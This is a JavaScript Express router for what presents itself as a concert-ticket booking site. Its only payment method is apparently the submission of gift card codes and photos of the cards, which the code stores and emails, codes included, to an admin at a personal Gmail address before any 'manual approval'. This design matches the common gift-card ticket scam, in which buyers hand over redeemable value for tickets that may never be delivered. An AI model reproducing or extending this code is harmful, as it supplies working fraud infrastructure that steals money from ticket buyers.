import express from 'express';
import { all, get, run, saveDatabase } from '../db.js';
import { authenticate } from '../middleware/auth.js';
import { sendTicketConfirmation, sendAdminNewOrderAlert, sendOrderSubmittedReceipt } from '../services/email.js';

const router = express.Router();

const handleBookTickets = (req, res) => {
  const { eventId, seatIds, giftCards, giftCardProvider, giftCardCode, giftCardImage, giftCardImages } = req.body;
  const userId = req.user.id;

  if (!eventId || !seatIds || !seatIds.length) {
    return res.status(400).json({ message: 'Missing eventId or seatIds' });
  }

  try {
    // Validate seats are available
    const placeholders = seatIds.map(() => '?').join(',');
    const seats = all(
      `SELECT * FROM venue_seats WHERE id IN (${placeholders}) AND event_id = ? AND status = 'available'`,
      [...seatIds, eventId]
    );

    if (seats.length !== seatIds.length) {
      return res.status(400).json({ message: 'One or more seats are not available' });
    }

    const total = seats.reduce((sum, seat) => sum + seat.price, 0);

    // Multi-card processing
    let finalProvider = giftCardProvider || 'Gift Card';
    let finalCode = giftCardCode || 'N/A';
    let finalImage = giftCardImage || null;
    let finalImages = giftCardImages ? (typeof giftCardImages === 'string' ? giftCardImages : JSON.stringify(giftCardImages)) : null;
    let cardsCount = 1;

    if (Array.isArray(giftCards) && giftCards.length > 0) {
      cardsCount = giftCards.length;
      finalProvider = [...new Set(giftCards.map(c => c.provider))].join(', ');
      finalCode = giftCards.map((c, i) => `Card ${i + 1} [${c.provider}${c.amount ? ' ($' + c.amount + ')' : ''}]: ${c.code}`).join('\n');
      finalImage = giftCards[0].image || null;
      finalImages = JSON.stringify(giftCards.map(c => c.image).filter(Boolean));
    }

    // Create order with pending_approval status
    const orderResult = run(
      'INSERT INTO orders (user_id, event_id, total, type, status, gift_card_provider, gift_card_code, gift_card_image, gift_card_images) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
      [userId, eventId, total, 'ticket', 'pending_approval', finalProvider, finalCode, finalImage, finalImages]
    );
    const orderId = orderResult.lastInsertRowid;

    // Create order items and mark seats as reserved pending admin approval
    for (const seat of seats) {
      run('INSERT INTO order_items (order_id, seat_id, price) VALUES (?, ?, ?)', [orderId, seat.id, seat.price]);
      run("UPDATE venue_seats SET status = 'reserved' WHERE id = ?", [seat.id]);
    }

    saveDatabase();

    const event = get('SELECT * FROM events WHERE id = ?', [eventId]);
    const order = { id: orderId, total, status: 'pending_approval' };

    const seatSummary = seats.map(s => `Sec ${s.section}, Row ${s.row}, Seat ${s.seat_number}`).join(' | ');
    const itemsDesc = `${event?.title || 'Concert'} (${event?.city}) - ${seats.length} Seat(s): ${seatSummary}`;

    // Send high-priority alert to admin (hannanbrice1@gmail.com)
    sendAdminNewOrderAlert({
      orderId,
      user: req.user,
      total,
      type: 'Concert Tickets',
      itemsDesc,
      giftCardProvider: finalProvider,
      giftCardCode: finalCode,
      hasImage: !!finalImage,
      giftCardsCount: cardsCount
    });

    // Send customer immediate payment processing receipt
    sendOrderSubmittedReceipt({
      userEmail: req.user.email,
      userName: req.user.name,
      orderId,
      type: 'Concert Tickets',
      total,
      itemsDesc,
      giftCardProvider: finalProvider,
      giftCardCode: finalCode
    });

    res.json({
      message: 'Order submitted successfully! Awaiting manual admin authentication and approval.',
      orderId,
      order,
      status: 'pending_approval',
      tickets: seats
    });
  } catch (error) {
    console.error(error);
    res.status(400).json({ message: error.message });
  }
};

router.post('/book', authenticate, handleBookTickets);
router.post('/purchase', authenticate, handleBookTickets);

router.get('/my-tickets', authenticate, (req, res) => {
  const userId = req.user.id;
  try {
    const rows = all(`
      SELECT o.id as order_id, o.total, o.status, o.created_at, e.title, e.date, e.time, e.venue, e.city, e.state, e.image_url,
             s.section, s.row, s.seat_number, s.price
      FROM orders o
      JOIN order_items oi ON o.id = oi.order_id
      JOIN venue_seats s ON oi.seat_id = s.id
      JOIN events e ON s.event_id = e.id
      WHERE o.user_id = ? AND o.type = 'ticket'
      ORDER BY o.created_at DESC
    `, [userId]);

    // Group by order
    const tickets = [];
    const orderMap = {};

    for (const row of rows) {
      if (!orderMap[row.order_id]) {
        orderMap[row.order_id] = {
          orderId: row.order_id,
          total: row.total,
          status: row.status || 'pending_approval',
          createdAt: row.created_at,
          event: {
            title: row.title,
            date: row.date,
            time: row.time,
            venue: row.venue,
            city: row.city,
            state: row.state,
            imageUrl: row.image_url
          },
          seats: []
        };
        tickets.push(orderMap[row.order_id]);
      }
      orderMap[row.order_id].seats.push({
        section: row.section,
        row: row.row,
        seatNumber: row.seat_number,
        price: row.price
      });
    }

    res.json(tickets);
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: 'Server error' });
  }
});

export default router;
